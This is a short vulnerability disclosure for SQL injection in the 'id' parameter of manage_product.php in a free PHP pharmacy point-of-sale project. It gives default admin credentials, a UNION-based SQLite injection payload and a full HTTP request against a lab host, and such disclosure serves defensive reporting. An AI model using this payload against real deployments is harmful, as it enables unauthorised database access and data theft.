# Pharmacy Point of Sale System v1.0 by sourcecodester has SQL injection 4

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14957/pharmacy-point-sale-system-using-php-and-sqlite-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /pharmacy/manage_product.php

Vulnerability location: /pharmacy/manage_product.php?id=, id

[+] Payload: /pharmacy/manage_product.php?id=1%27%20union%20select%201,sqlite_version(),3,4,5,6,7--+ // Leak place ---> id

```sql
GET /pharmacy/manage_product.php?id=1%27%20union%20select%201,sqlite_version(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=aql25isdr8lel085k89oteptif
Connection: close
```
<img width="916" height="503" alt="image" src="https://github.com/user-attachments/assets/6ac79958-c5ac-4c8b-b6c5-66ad6423323b" />

